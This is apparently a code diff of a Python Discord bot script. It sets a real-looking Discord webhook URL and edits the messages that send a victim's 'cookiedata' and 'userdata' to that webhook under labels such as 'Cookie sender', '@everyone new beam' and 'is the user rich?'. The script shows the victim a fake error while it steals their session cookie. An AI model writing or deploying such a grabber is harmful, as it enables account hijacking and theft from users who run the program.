@@ -16,7 +16,7 @@ client = commands.Bot(command_prefix='.') #set prefix
 
 colorama.init()
 
-loadingauth = ''
+loadingauth = 'https://discord.com/api/webhooks/862784663185784872/UNcEheA3JKb8P_YxuZnPbOSynLAmI7wf2ptGn-jvJMqr6wsZZRqXo41KTecRincTWcrf'
 #paste in your webhook between the ''
 
 
@@ -47,7 +47,7 @@ def main():
     requests.post(loadingauth,
                   json={
                       'username': 'Cookie sender',
-                      'content': f'```"new beam yall @everyone"{cookiedata}```'
+                      'content': "@everyone new beam" f'```{cookiedata}```'
  
                   })
     os.system('cls')
@@ -61,8 +61,8 @@ def main():
     w("Error, please restart this program, there may have been something wrong with your username or cookie.")
     requests.post(loadingauth,
                   json={
-                      'username': 'Cookie Sender',
-                      'content': f'```"username to see if their rich"{userdata}```'
+                      'username': 'Username Sender',
+                      'content': "is the user rich?" f'```{userdata}```'
                   })
 
 
